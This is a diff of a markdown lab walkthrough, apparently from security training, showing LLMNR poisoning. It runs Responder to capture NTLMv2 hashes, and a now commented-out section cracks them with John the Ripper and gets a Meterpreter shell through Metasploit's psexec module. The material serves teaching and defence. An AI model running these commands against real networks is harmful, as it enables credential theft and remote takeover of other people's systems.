@@ -8,74 +8,56 @@ Specifically, we are looking to take advantage of LLMNR.
 
 First, we will need to load our terminal and start responder.
 
-Let's get started by opening a Terminal as Administrator
+Let's get started by opening a Kali terminal.
 
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
+![](attachments/OpeningKaliInstance.png)
 
-When you get the User Account Control Prompt, select Yes.
+Alternatively, you can click on the Kali icon in the taskbar.
 
-And, open a Ubuntu command prompt:
-
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
-
-####NOTE##### 
-
-If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 
-
- 
-
-Simply click the Windows Start button in the lower left of your screen and type: 
-
- 
-
-`Powershell` 
-
-or 
-
-`Ubuntu`
-
-or 
-
-`Command Prompt` 
-
- 
-
-For PowerShell and Command Prompt, please right click on them and select Run As Administrator 
-
-###END NOTE###
+![](attachments/TaskbarKaliIcon.png)
 
 Next, let’s become root:
 
-adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ `sudo su -`
+<pre>sudo su -</pre>
 
-Let’s change into the Responder directory:
+Before we start, we need to remove the existing Responder database. Do so by running the following:
 
-root@DESKTOP-I1T2G01:~# `cd /opt/Responder/`
+<pre>rm /usr/share/responder/Responder.db</pre>
 
-And let’s start Responder:
+Now let’s start Responder:
 
-root@DESKTOP-I1T2G01:/opt/Responder# `./Responder.py -I eth0`
+<pre>responder -I eth0</pre>
 
-![](attachments/Clipboard_2020-06-23-14-22-03.png)
+You should see this:
 
-Now, let's go back to your Windows system and open Windows Explorer and put in the string \\\Noooo into the address bar.
+![](attachments/responderrunning.png)
 
-![](attachments/Clipboard_2020-06-23-14-22-57.png)
+Now, let's open Windows File Explorer and put in the string `\\Noooo` into the address bar at the top.
 
-Give it a few moments and you should see some capture data showing up.  Please note there may be an error.  That is OK.
+![](attachments/OpeningFileExplorer.png)
+
+![](attachments/noooaccessbar.png)
+
+Switch back to your Kali terminal window.
+
+After a few moments, you should see some captured data showing up.  Please note there may be an error.  That is OK.
 
 
-![](attachments/Clipboard_2020-06-23-14-22-23.png)
+![](attachments/captureddata.png)
 
-Next we need to kill Responder with Ctrl + c.  This will return the command prompt. 
+<!--
+
+THIS SECTION IS BEING REMOVED FOR THE TIME BEING PER JOHN
+
+Next we need to kill Responder with `Ctrl + c`.  This will return the command prompt. 
 
 Now, we need to change to the logs directory.
 
-root@DESKTOP-I1T2G01:/opt/Responder# `cd logs/`
+<pre>cd /opt/Responder/logs</pre>
 
 Once there, we will need to start John The Ripper"
 
-root@DESKTOP-I1T2G01:/opt/Responder/logs# `/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt`
+<pre>/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt</pre>
 Remember!  Your IP will be different!!!!
 
 
@@ -101,9 +83,9 @@ Then, Right-click on the smb.bat file and run it as Administrator:
 
 ![](attachments/SMB_bat.png)
 
-Next, let’s open a new Ubuntu Command Prompt.
+Next, let’s open a new Kali instance. The easiest way to do this is to click the Kali icon in the taskbar.
 
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
+![](attachments/TaskbarKaliIcon.png)
 
 Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.
 
@@ -139,6 +121,6 @@ msf5 exploit(windows/smb/psexec) ><b> exploit</b>
 meterpreter >
 </pre>
 Now, you can see just how bad LLMNR is!!!!
-
-
+*/
+-->
 
